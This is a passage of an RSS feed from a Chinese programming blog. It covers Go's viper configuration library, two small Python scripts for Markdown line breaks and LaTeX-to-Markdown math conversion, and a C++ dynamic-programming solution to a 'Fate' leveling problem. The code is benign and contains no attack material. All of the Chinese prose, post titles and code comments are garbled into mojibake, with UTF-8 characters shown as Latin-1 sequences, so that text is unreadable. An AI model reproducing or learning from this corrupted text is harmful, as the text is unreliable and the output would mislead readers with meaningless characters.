plaintext"><table><tr><td class="code"><pre><span class="line">go get github.com/spf13/viper</span><br></pre></td></tr></table></figure></li><li><p><strong>åŸºæœ¬é…ç½®è¯»å–</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// è®¾ç½®é…ç½®æ–‡ä»¶åå’Œè·¯å¾„</span></span><br><span class="line">    viper.SetConfigName(<span class="string">&quot;config&quot;</span>) <span class="comment">// é…ç½®æ–‡ä»¶åç§°(æ— æ‰©å±•å)</span></span><br><span class="line">    viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)   <span class="comment">// å¦‚æœé…ç½®æ–‡ä»¶çš„åç§°ä¸­æ²¡æœ‰æ‰©å±•åï¼Œåˆ™éœ€è¦é…ç½®æ­¤é¡¹</span></span><br><span class="line">    viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)      <span class="comment">// æŸ¥æ‰¾é…ç½®æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–é…ç½®æ–‡ä»¶</span></span><br><span class="line">    err := viper.ReadInConfig()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Error reading config file, %s&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–é…ç½®ä¿¡æ¯</span></span><br><span class="line">    host := viper.GetString(<span class="string">&quot;server.host&quot;</span>)</span><br><span class="line">    port := viper.GetInt(<span class="string">&quot;server.port&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Host: %s, Port: %d\n&quot;</span>, host, port)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡è®¾æœ‰ä¸€ä¸ªåä¸º <code>config.yaml</code> çš„é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></li><li><p><strong>ä»ç¯å¢ƒå˜é‡è¯»å–é…ç½®</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">viper.AutomaticEnv() <span class="comment">// è‡ªåŠ¨è¯»å–ç¯å¢ƒå˜é‡</span></span><br></pre></td></tr></table></figure></li><li><p><strong>è®¾ç½®é»˜è®¤å€¼</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">viper.SetDefault(<span class="string">&quot;server.port&quot;</span>, <span class="number">8080</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>å®æ—¶é‡è½½é…ç½®æ–‡ä»¶</strong></p><ul><li><code>viper</code> æ”¯æŒå®æ—¶ç›‘æ§é…ç½®æ–‡ä»¶çš„æ›´æ”¹ï¼Œå¹¶å¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°æ¥å¤„ç†æ›´æ”¹äº‹ä»¶ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">viper.WatchConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(e fsnotify.Event)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Config file changed:&quot;</span>, e.Name)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å‘½ä»¤è¡Œå‚æ•°</strong></p><ul><li><code>viper</code> å¯ä»¥å’Œ <code>cobra</code> åº“ï¼ˆåŒæ ·ç”± spf13 æä¾›ï¼‰ç»“åˆä½¿ç”¨ï¼Œä»¥æ”¯æŒä»å‘½ä»¤è¡Œå‚æ•°è¯»å–é…ç½®ã€‚</li></ul></li></ol><h3 id="æ€»ç»“-4"><a href="#æ€»ç»“-4" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><code>viper</code> ä¸º Go åº”ç”¨ç¨‹åºæä¾›äº†ä¸€ç§çµæ´»ä¸”å¼ºå¤§çš„æ–¹å¼æ¥å¤„ç†é…ç½®ã€‚å®ƒçš„å¤šæ¥æºè¯»å–èƒ½åŠ›ã€å®æ—¶é‡è½½åŠŸèƒ½ä»¥åŠä¸å…¶ä»–åº“çš„è‰¯å¥½é›†æˆï¼Œä½¿å¾— <code>viper</code> æˆä¸º Go å¼€å‘è€…å¤„ç†é…ç½®çš„é¦–é€‰åº“ã€‚é€šè¿‡ç†Ÿç»ƒä½¿ç”¨ <code>viper</code>ï¼Œä½ å¯ä»¥æ›´å®¹æ˜“åœ°ç®¡ç†å’Œä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘ä»£ç ã€‚ğŸ’»ğŸ”§ğŸ“‚ğŸš€</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/go/">go</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/go%E7%9A%84%E5%85%A5%E9%97%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>markdownç©ºè¡Œæ·»åŠ brçš„è„šæœ¬</title>
      <link>https://cjliblog.top/2023/12/13/markdown%E7%A9%BA%E8%A1%8C%E6%B7%BB%E5%8A%A0br%E8%84%9A%E6%9C%AC/</link>
      <guid>https://cjliblog.top/2023/12/13/markdown%E7%A9%BA%E8%A1%8C%E6%B7%BB%E5%8A%A0br%E8%84%9A%E6%9C%AC/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<br><p>å†™åšå®¢çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜ï¼Œå› ä¸ºmdåœ¨webä¸Šç©ºè¡Œæ˜¯è‡ªåŠ¨åˆ é™¤çš„ï¼Œé™¤éä½¿ç”¨<code>&lt;/br&gt;</code>ï¼Œå› æ­¤ç¼–å†™ä¸€ä¸‹pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_br_to_empty_lines</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> line.strip() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                file.write(<span class="string">&#x27;&lt;/br&gt;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file.write(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line">input_md_file = <span class="string">&#x27;s:/11953/Desk/learning_doc.md&#x27;</span>  <span class="comment"># æ›¿æ¢æˆä½ çš„Markdownæ–‡ä»¶å</span></span><br><span class="line">output_md_file = <span class="string">&#x27;s:/11953/Desk/233.md&#x27;</span>  <span class="comment"># æ›¿æ¢æˆè¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line">add_br_to_empty_lines(input_md_file, output_md_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E6%8A%80%E6%9C%AF%E8%B4%B4/">æŠ€æœ¯è´´</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/markdown%E7%A9%BA%E8%A1%8C%E6%B7%BB%E5%8A%A0br%E8%84%9A%E6%9C%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>åˆ¶ä½œä¸€ä¸ªlatex-markdownæ•°å­¦å…¬å¼è½¬åŒ–å™¨</title>
      <link>https://cjliblog.top/2023/12/11/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAlatex-markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%BD%AC%E5%8C%96%E5%99%A8/</link>
      <guid>https://cjliblog.top/2023/12/11/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAlatex-markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%BD%AC%E5%8C%96%E5%99%A8/</guid>
      <pubDate>Sun, 10 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<p>åœ¨ä½¿ç”¨GPTè¿›è¡Œè¾“å‡ºæ•°å­¦å…¬å¼çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªéš¾å—çš„åœ°æ–¹ï¼Œå°±æ˜¯å®ƒæ˜¯latexåŸç”Ÿä»£ç ï¼Œå¯¼è‡´ç²˜è´´åˆ°markdownçš„æ—¶å€™ä¼šæ˜¾ç¤ºä¸€å †æ‹¬å·å¹¶ä¸”åˆ èµ·æ¥æ¯”è¾ƒéº»çƒ¦ã€‚è€Œmdçš„å…¬å¼æ ‡è®°æ–¹æ³•æ˜¯ç”¨<code>$$</code>ã€‚å› æ­¤ï¼Œå¼€å‘ä¸€ä¸ªå°è„šæœ¬ç”¨äºç®€ä¾¿è½¬åŒ–ã€‚ã€‚</p><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_latex_in_markdown</span>(<span class="params">file_path, output_path</span>):</span><br><span class="line">    <span class="comment"># æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… LaTeX ä»£ç </span></span><br><span class="line">    regex1 = <span class="string">r&quot;\\\[(.*?)\\\]&quot;</span></span><br><span class="line">    regex2 = <span class="string">r&quot;\\\((.*?)\\\)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ›¿æ¢ LaTeX ä»£ç </span></span><br><span class="line">    formatted_content = re.sub(regex1, <span class="string">r&quot;$\1$&quot;</span>, content)</span><br><span class="line">    formatted_content = re.sub(regex2, <span class="string">r&quot;$\1$&quot;</span>, formatted_content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å†™å…¥è¾“å‡ºæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(formatted_content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line">input_file_path = <span class="string">&#x27;input.txt&#x27;</span>  <span class="comment"># è¿™é‡Œæ›¿æ¢æˆä½ çš„è¾“å…¥æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">output_file_path = <span class="string">&#x27;output.txt&#x27;</span>  <span class="comment"># è¿™é‡Œæ›¿æ¢æˆä½ æƒ³è¦çš„è¾“å‡ºæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">format_latex_in_markdown(input_file_path, output_file_path)</span><br></pre></td></tr></table></figure><p>åªéœ€è¦åˆ›å»ºè¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œç„¶åæŠŠæƒ³è¦è½¬åŒ–çš„æ”¾åœ¨input.txté‡Œï¼Œå°±å¯ä»¥åœ¨output.txtä¸­è·å¾—è¾“å‡ºäº†ã€‚ä½¿ç”¨èµ·æ¥è›®æ–¹ä¾¿çš„ã€‚</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E6%8A%80%E6%9C%AF%E8%B4%B4/">æŠ€æœ¯è´´</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/11/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAlatex-markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%BD%AC%E5%8C%96%E5%99%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>åŠ¨æ€è§„åˆ’é¢˜â€”â€”fate</title>
      <link>https://cjliblog.top/2023/12/11/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94fate/</link>
      <guid>https://cjliblog.top/2023/12/11/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94fate/</guid>
      <pubDate>Sun, 10 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>æœ€è¿‘xhdæ­£åœ¨ç©ä¸€æ¬¾å«åšFATEçš„æ¸¸æˆï¼Œä¸ºäº†å¾—åˆ°æå“è£…å¤‡ï¼Œxhdåœ¨ä¸åœçš„æ€æ€ªåšä»»åŠ¡ã€‚ä¹…è€Œä¹…ä¹‹xhdå¼€å§‹å¯¹æ€æ€ªäº§ç”Ÿçš„åŒæ¶æ„Ÿï¼Œä½†åˆä¸å¾—ä¸é€šè¿‡æ€æ€ªæ¥å‡å®Œè¿™æœ€åä¸€çº§ã€‚ç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œxhdå‡æ‰æœ€åä¸€çº§è¿˜éœ€nçš„ç»éªŒå€¼ï¼Œxhdè¿˜ç•™æœ‰mçš„å¿è€åº¦ï¼Œæ¯æ€ä¸€ä¸ªæ€ªxhdä¼šå¾—åˆ°ç›¸åº”çš„ç»éªŒï¼Œå¹¶å‡æ‰ç›¸åº”çš„å¿è€åº¦ã€‚å½“å¿è€åº¦é™åˆ°0æˆ–è€…0ä»¥ä¸‹æ—¶ï¼Œxhdå°±ä¸ä¼šç©è¿™æ¸¸æˆã€‚xhdè¿˜è¯´äº†ä»–æœ€å¤šåªæ€såªæ€ªã€‚è¯·é—®ä»–èƒ½å‡æ‰è¿™æœ€åä¸€çº§å—ï¼Ÿ</p><h3 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h3><p>è¾“å…¥æ•°æ®æœ‰å¤šç»„ï¼Œå¯¹äºæ¯ç»„æ•°æ®ç¬¬ä¸€è¡Œè¾“å…¥nï¼Œmï¼Œkï¼Œs(0 &lt; n,m,k,s &lt; 100)å››ä¸ªæ­£æ•´æ•°ã€‚åˆ†åˆ«è¡¨ç¤ºè¿˜éœ€çš„ç»éªŒå€¼ï¼Œä¿ç•™çš„å¿è€åº¦ï¼Œæ€ªçš„ç§æ•°å’Œæœ€å¤šçš„æ€æ€ªæ•°ã€‚æ¥ä¸‹æ¥è¾“å…¥kè¡Œæ•°æ®ã€‚æ¯è¡Œæ•°æ®è¾“å…¥ä¸¤ä¸ªæ­£æ•´æ•°aï¼Œb(0 &lt; a,b &lt; 20)ï¼›åˆ†åˆ«è¡¨ç¤ºæ€æ‰ä¸€åªè¿™ç§æ€ªxhdä¼šå¾—åˆ°çš„ç»éªŒå€¼å’Œä¼šå‡æ‰çš„å¿è€åº¦ã€‚(æ¯ç§æ€ªéƒ½æœ‰æ— æ•°ä¸ª)</p><h3 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼:"></a>è¾“å‡ºæ ¼å¼:</h3><p>è¾“å‡ºå‡å®Œè¿™çº§è¿˜èƒ½ä¿ç•™çš„æœ€å¤§å¿è€åº¦ï¼Œå¦‚æœæ— æ³•å‡å®Œè¿™çº§è¾“å‡º-1ã€‚</p><h3 id="è¾“å…¥æ ·ä¾‹"><a href="#è¾“å…¥æ ·ä¾‹" class="headerlink" title="è¾“å…¥æ ·ä¾‹:"></a>è¾“å…¥æ ·ä¾‹:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 10 1 10</span><br><span class="line">1 1</span><br><span class="line">10 10 1 9</span><br><span class="line">1 1</span><br><span class="line">9 10 2 10</span><br><span class="line">1 1</span><br><span class="line">2 2</span><br></pre></td></tr></table></figure><h3 id="è¾“å‡ºæ ·ä¾‹"><a href="#è¾“å‡ºæ ·ä¾‹" class="headerlink" title="è¾“å‡ºæ ·ä¾‹:"></a>è¾“å‡ºæ ·ä¾‹:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">-1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="æˆ‘çš„é¢˜è§£ï¼š"><a href="#æˆ‘çš„é¢˜è§£ï¼š" class="headerlink" title="æˆ‘çš„é¢˜è§£ï¼š"></a>æˆ‘çš„é¢˜è§£ï¼š</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> k, <span class="type">int</span> s, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; monsters)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//åˆ†åˆ«è¡¨ç¤ºè¿˜éœ€çš„ç»éªŒå€¼nï¼Œä¿ç•™çš„å¿è€åº¦mï¼Œæ€ªçš„ç§æ•°kå’Œæœ€å¤šçš„æ€æ€ªæ•°s</span></span><br><span class="line">    <span class="function">vector <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, vector(s + <span class="number">1</span>, <span class="number">-1000</span>))</span></span>;<span class="comment">//è¿˜éœ€çš„ç»éªŒå€¼ï¼Œæ€æ€ªæ•°ï¼Œå‰©ä½™çš„å¿è€åº¦ï¼Œ-1000ä»£è¡¨ä¸å­˜åœ¨</span></span><br><span class="line">    dp[n][<span class="number">0</span>] = m;<span class="comment">//åˆšå¼€å§‹ï¼Œè¿˜å·®nç»éªŒï¼Œå¿è€åº¦ä¸ºm</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;<span class="comment">//éå†æ‰€æœ‰çš„æ€ª</span></span><br><span class="line">        <span class="type">int</span> exp = monsters[i].first, cost = monsters[i].second;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; s; ++j) &#123;<span class="comment">//æ€jåªå®ƒï¼Œå‰©ä½™çš„å¿è€åº¦</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> cur_exp = <span class="number">0</span>; cur_exp &lt;= n; ++cur_exp) &#123;<span class="comment">//ä¸ºä»€ä¹ˆä»å‰å¾€åï¼Ÿå› ä¸ºåé¢çš„éœ€è¦ç”¨åˆ°å‰é¢çš„ç»éªŒã€‚</span></span><br><span class="line">                <span class="keyword">if</span> (dp[cur_exp][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//å¿è€åº¦å­˜åœ¨</span></span><br><span class="line">                    <span class="type">int</span> next_exp = <span class="built_in">max</span>(<span class="number">0</span>, cur_exp - exp);<span class="comment">//æ¨å¯¼æ€ä¸€åªæ€ªä¹‹åçš„ç»éªŒï¼Œæœ€å°ä¸º0</span></span><br><span class="line">                    dp[next_exp][j + <span class="number">1</span>] = <span class="built_in">max</span>(dp[next_exp][j + <span class="number">1</span>], dp[cur_exp][j] - cost);<span class="comment">//æ›´æ–°æ€ä¸€åªæ€ªåå¿è€åº¦ï¼Œé€‰å¿è€åº¦æœ€å¤šçš„ã€‚</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= s; ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[<span class="number">0</span>][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//ç»éªŒåˆ°è¾¾ï¼Œå¿è€åº¦å­˜åœ¨</span></span><br><span class="line">            result = <span class="built_in">max</span>(result, dp[<span class="number">0</span>][j]);<span class="comment">//æ‰¾åˆ°æœ€å¤§çš„é‚£ä¸ª</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, k, s;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; n &gt;&gt; m &gt;&gt; k &gt;&gt; s) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">monsters</span>(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            cin &gt;&gt; monsters[i].first &gt;&gt; monsters[i].second;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">solve</span>(n, m, k, s, monsters);<span class="comment">//ä¿ç•™çš„å¿è€åº¦</span></span><br><span class="line">        <span class="keyword">if</span> (result &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ€è€ƒï¼š"><a href="#æ€è€ƒï¼š" class="headerlink" title="æ€è€ƒï¼š"></a>æ€è€ƒï¼š</h3><h3 id="é—®é¢˜èƒŒæ™¯"><a href="#é—®é¢˜èƒŒæ™¯" class="headerlink" title="é—®é¢˜èƒŒæ™¯"></a>é—®é¢˜èƒŒæ™¯</h3><ul><li>ä½ éœ€è¦è·å¾—ä¸€å®šçš„ç»éªŒå€¼ï¼ˆ<code>n</code>ï¼‰ã€‚</li><li>ä½ æœ‰ä¸€å®šçš„å¿è€åº¦ï¼ˆ<code>m</code>ï¼‰ï¼Œæ¯æ¬¡æ€æ€ªéƒ½ä¼šæ¶ˆè€—ä¸€éƒ¨åˆ†ã€‚</li><li>æ€ªç‰©æœ‰å¤šç§ï¼ˆ<code>k</code>ç§ï¼‰ï¼Œæ¯ç§æ€ªç‰©æä¾›ä¸åŒçš„ç»éªŒå€¼å’Œæ¶ˆè€—ä¸åŒçš„å¿è€åº¦ã€‚</li><li>ä½ æœ€å¤šå¯ä»¥æ€<code>s</code>ä¸ªæ€ªç‰©ã€‚</li></ul><p>æ­¤å¤„æˆ‘ä»¬ä¼šå‘ç°é—®é¢˜çš„çº¦æŸæœ‰ç‚¹å¤šï¼Œä¸€ç»´æ•°ç»„å·²ç»æ»¡è¶³ä¸äº†æˆ‘ä»¬ã€‚</p><h3 id="åŠ¨æ€è§„åˆ’çš„æ€è·¯"><a href="#åŠ¨æ€è§„åˆ’çš„æ€è·¯" class="headerlink" title="åŠ¨æ€è§„åˆ’çš„æ€è·¯"></a>åŠ¨æ€è§„åˆ’çš„æ€è·¯</h3><ol><li><strong>å®šä¹‰çŠ¶æ€</strong>: <code>dp[i][j]</code>è¡¨ç¤ºä½ è¿˜éœ€è¦<code>i</code>ç‚¹ç»éªŒï¼Œä¸”æ€äº†<code>j</code>ä¸ªæ€ªç‰©æ—¶çš„å‰©ä½™æœ€å¤§å¿è€åº¦ã€‚</li><li><strong>åˆå§‹åŒ–çŠ¶æ€</strong>: åˆå§‹æ—¶ï¼Œä½ éœ€è¦<code>n</code>ç‚¹ç»éªŒï¼Œä¸”æœªæ€ä»»ä½•æ€ªç‰©ï¼Œå› æ­¤<code>dp[n][0] = m</code>ã€‚</li><li><strong>çŠ¶æ€è½¬ç§»</strong>:<ul><li>éå†æ¯ä¸€ç§æ€ªç‰©ã€‚</li><li>å¯¹äºæ¯ç§æ€ªç‰©ï¼Œå°è¯•æ€<code>0</code>åˆ°<code>s-1</code>ä¸ªï¼ŒæŸ¥çœ‹ä¸åŒæ•°é‡ä¸‹çš„å‰©ä½™å¿è€åº¦å’Œæ‰€éœ€ç»éªŒã€‚</li><li>å¯¹æ¯ä¸ªæ€æ€ªæ•°é‡ï¼Œæ£€æŸ¥å¦‚æœæ€äº†è¿™ä¸ªæ€ªç‰©åï¼Œæ˜¯å¦èƒ½å¾—åˆ°æ›´å¥½çš„å‰©ä½™å¿è€åº¦ï¼ˆå³<code>dp[next_exp][j+1]</code>ï¼‰ã€‚</li><li>è½¬ç§»æ–¹ç¨‹ï¼šå¦‚æœæ€æ­»ä¸€ä¸ªæ€ªç‰©åå‰©ä½™å¿è€åº¦æ›´é«˜ï¼Œåˆ™æ›´æ–°<code>dp[next_exp][j+1]</code>ã€‚</li></ul></li><li><strong>å¯»æ‰¾ç»“æœ</strong>: åœ¨æ‰€æœ‰ç»éªŒå€¼ä¸º<code>0</code>ï¼ˆå³è¾¾åˆ°ç›®æ ‡ç»éªŒå€¼ï¼‰çš„æƒ…å†µä¸­ï¼Œæ‰¾åˆ°å¿è€åº¦æœ€å¤§çš„é‚£ä¸ªã€‚</li></ol><br><p>é¦–å…ˆçœ‹mainå‡½æ•°ï¼Œè¿™æ˜¯æˆ‘ä»¬è§£é¢˜çš„ä¸»è¦æ­¥éª¤ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">monsters</span>(k);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªmostersæ•°å¯¹ï¼Œä»£è¡¨æ€ªç‰©çš„ç§ç±»å­˜å‚¨ç»“æ„ã€‚æœ‰kç§æ€ªå…½ï¼Œè€Œæ¯ç§æ€ªå…½ä¼šç»™å‡ºä¸¤ä¸ªæ­£æ•´æ•°aï¼Œb(0 &lt; a,b &lt; 20)ï¼›åˆ†åˆ«è¡¨ç¤ºæ€æ‰ä¸€åªè¿™ç§æ€ªä¼šå¾—åˆ°çš„&#x3D;&#x3D;ç»éªŒå€¼&#x3D;&#x3D;å’Œ&#x3D;&#x3D;ä¼šå‡æ‰çš„å¿è€åº¦&#x3D;&#x3D;ã€‚æ³¨æ„æ­¤å¤„ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„å¿è€åº¦æ˜¯çœ‹å‰©ä½™çš„å¿è€åº¦ï¼Œè€Œç»éªŒå€¼æ˜¯çœ‹æ€»å…±çš„ç»éªŒå€¼ï¼Œä¸€ä¸ªæ˜¯æ¶ˆè€—ï¼Œä¸€ä¸ªæ˜¯å¢åŠ ï¼Œè€Œç›®æ ‡æ˜¯å¾—åˆ°å¿è€åº¦çš„æœ€å¤§å€¼ã€‚é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆä¼šæƒ³åˆ°å°½é‡å°‘å‡æ‰å¿è€åº¦ï¼Œå°½é‡å¢åŠ æ›´å¤šçš„ç»éªŒã€‚</p><br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¾ˆç®€å•ã€‚è°ƒç”¨ä¸€ä¸ªå‡½æ•°è·å¾—å¿è€åº¦çš„æœ€å¤§å€¼ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°†ä¼šè¿”å›è´Ÿå€¼ï¼›å¦‚æœå­˜åœ¨ï¼Œè¾“å‡ºå³å¯ã€‚</p><p><br><br><br></p><p>æ¥ä¸‹æ¥çœ‹åˆ°solveå‡½æ•°ï¼ŒçœŸæ­£çš„é€»è¾‘æ 